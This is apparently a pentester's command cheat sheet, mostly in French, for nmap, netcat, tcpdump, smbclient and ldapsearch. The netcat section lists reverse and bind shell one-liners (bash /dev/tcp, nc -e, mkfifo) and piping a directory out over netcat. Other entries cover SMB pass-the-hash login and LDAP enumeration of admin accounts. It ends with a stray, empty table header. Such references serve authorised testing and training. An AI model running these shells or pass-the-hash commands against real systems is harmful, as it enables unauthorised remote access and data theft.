nmap Full scan + service detection
---- Common -----
[NSE vuln] — nmap --script vuln <IP>
[Full + version] — nmap -p- -sV <IP>
[Top ports] — nmap --top-ports 10 <IP>
[Top 100 port] — nmap -F <IP>
[Port unique] — nmap -p 443 <IP>
---- Others -----
[Scan simple] — nmap <IP>
[Scan complet] — nmap -p- <IP>
[Version scan] — nmap -sV <IP>
[OS detection] — nmap -O <IP>
[Aggressive scan] — nmap -A <IP>
[SYN scan] — nmap -sS <IP>
[UDP scan] — nmap -sU <IP>
[Port range] — nmap -p 1-1000 <IP>
[Network scan] — nmap -sn 192.168.1.0/24
[Ping sweep] — nmap -sn <network>/24
[No ping] — nmap -Pn <IP>
[SSH scripts] — nmap -p 22 --script ssh* <IP>
[HTTP scripts] — nmap -p 80,443 --script http* <IP>
[Output file] — nmap -oN scan.txt <IP>
--- Rate / Speed ---
[0 Paranoid; 1 Sneaky; 2 Polite; 3 Normal; 4 Aggressive; 5 insane] — nmap -T [0-5]
[rate | probe | parallelism] --max-rate 50 | --min-rate 15 | --min-parallelism 100
---- TYPE OF SCAN -----
[TCP+UDP (root)] — nmap -sS -sU <IP>
[TCP+UDP] — nmap -sT <IP>

NetcatBanner grabbing and raw TCP/UDP connections
---- Common -----
[Listener simple] — nc -l -p 8080
[Client simple] — nc <IP> 8080
[Chat bidirectionnel] — nc -l -p 8080 (serveur) / nc <IP> 8080 (client)
---- Reverse Shell -----
[Reverse shell bash] — bash -i >& /dev/tcp/<IP>/8080 0>&1
[Reverse shell nc (GNU)] — nc <IP> 8080 -e /bin/bash
[Reverse shell mkfifo] — mkfifo /tmp/f; nc <IP> 8080 < /tmp/f | /bin/bash > /tmp/f
---- Bind Shell -----
[Bind shell nc (GNU)] — nc -l -p 8080 -e /bin/bash
[Bind shell mkfifo] — rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l -p 8080 > /tmp/f
---- File Transfer -----
[Send file] — nc <IP> 9000 < file.txt
[Receive file] — nc -l -p 9000 > file.txt
[Send directory tar] — tar -cf - dir/ | nc <IP> 9000
[Receive directory tar] — nc -l -p 9000 | tar -xf -
---- Port Scanning -----
[Scan ports] — nc -z <IP> 1-1000
[Scan verbose] — nc -zv <IP> 80 443 8080
---- UDP -----
[UDP client] — nc -u <IP> 53
[UDP listener] — nc -u -l -p 53
---- Advanced -----
[Timeout] — nc -w 3 <IP> 8080
[Keep alive] — nc -k -l -p 8080
[Proxy connect] — nc -X connect -x 127.0.0.1:8080 <IP> 80
[Hex dump] — nc <IP> 8080 | xxd
---- Debug / Info -----
[Verbose] — nc -v <IP> 8080
[Very verbose] — nc -vv <IP> 8080
tcpdumpCLI packet capture on interfaces
---- Common -----
[Interface par défaut] — tcpdump
[Interface spécifique] — tcpdump -i eth0
[Verbose] — tcpdump -v -i eth0
[Very verbose] — tcpdump -vv -i eth0
[Capture tout] — tcpdump -i any
---- Filters -----
[IP source] — tcpdump src <IP>
[IP destination] — tcpdump dst <IP>
[Port spécifique] — tcpdump port 80
[TCP seulement] — tcpdump tcp
[UDP seulement] — tcpdump udp
[Host] — tcpdump host <IP>
[Net] — tcpdump net 192.168.1.0/24
[Protocol ARP] — tcpdump arp
[Protocol ICMP] — tcpdump icmp
---- Advanced Filters -----
[HTTP GET] — tcpdump -A -i eth0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) > 0)'
[DNS] — tcpdump -i eth0 port 53
[TLS handshake] — tcpdump -i eth0 port 443
[Exclude host] — tcpdump -i eth0 not host <IP>
---- Output -----
[Write pcap] — tcpdump -i eth0 -w capture.pcap
[Read pcap] — tcpdump -r capture.pcap
[Hex output] — tcpdump -XX -i eth0
[ASCII output] — tcpdump -A -i eth0
---- Performance -----
[Limit packets] — tcpdump -c 100 -i eth0
[Snaplen] — tcpdump -s 0 -i eth0
[No name resolution] — tcpdump -n -i eth0
[Fast mode] — tcpdump -q -i eth0
---- Useful -----
[Promiscuous off] — tcpdump -p -i eth0
[Timestamp] — tcpdump -tttt -i eth0
[Filter expression] — tcpdump -i eth0 'tcp and port 22'

smbclientAccess SMB shares from Linux
---- Common -----
[Lister les partages] — smbclient -L //<IP>/ -U ""
[Connexion anonyme] — smbclient //<IP>/<share> -N
[Connexion avec user] — smbclient //<IP>/<share> -U user
[Connexion avec mot de passe] — smbclient //<IP>/<share> -U user%password
---- Navigation -----
[Lister fichiers] — ls
[Changer de dossier] — cd [DIR]
[Voir le chemin] — pwd
---- Download / Upload -----
[Télécharger fichier] — get file.txt
[Uploader fichier] — put file.txt
[Télécharger dossier (recurse)] — recurse ON ; prompt OFF ; mget *
[Uploader dossier] — recurse ON ; prompt OFF ; mput *
---- Options utiles -----
[Mode verbose] — smbclient //<IP>/<share> -U user -d 3
[Forcer SMB1] — smbclient //<IP>/<share> -U user --option='client min protocol=NT1'
[Forcer SMB2] — smbclient //<IP>/<share> -U user --option='client max protocol=SMB2'
[Spécifier port] — smbclient //<IP>/<share> -U user -p 445
---- Auth / Security -----
[NTLM auth] — smbclient //<IP>/<share> -U user --option='client ntlmv2 auth=yes'
[Connexion sans mot de passe] — smbclient //<IP>/<share> -U "" -N
[Connexion avec hash NTLM] — smbclient //<IP>/<share> -U user --pw-nt-hash <hash>
---- Mount (Linux) -----
[Mount SMB] — mount -t cifs //<IP>/<share> /mnt/smb -o user=user,password=pass
[Mount anonyme] — mount -t cifs //<IP>/<share> /mnt/smb -o guest
---- Debug -----
[Voir les options] — smbclient -h
[Debug niveau 10] — smbclient //<IP>/<share> -U user -d 10
ldapsearchQuery LDAP/AD for users and objects
---- Common -----
[Bind anonyme] — ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
[Exemple DC nommé] — ldapsearch -x -H ldap://dc.target.com -b "dc=target,dc=com"
---- Authentifié -----
[Bind avec creds] — ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "dc=domain,dc=com"
[Lister tous les users] — ldapsearch -x -H ldap://<IP> -D "user@domain.com" -w password -b "dc=domain,dc=com" "(objectClass=user)"
---- Filtres utiles -----
[Comptes désactivés] — ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=2)"
[Admin accounts] — ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" "(adminCount=1)"

Header                      What It Protects Against                                           Example Value
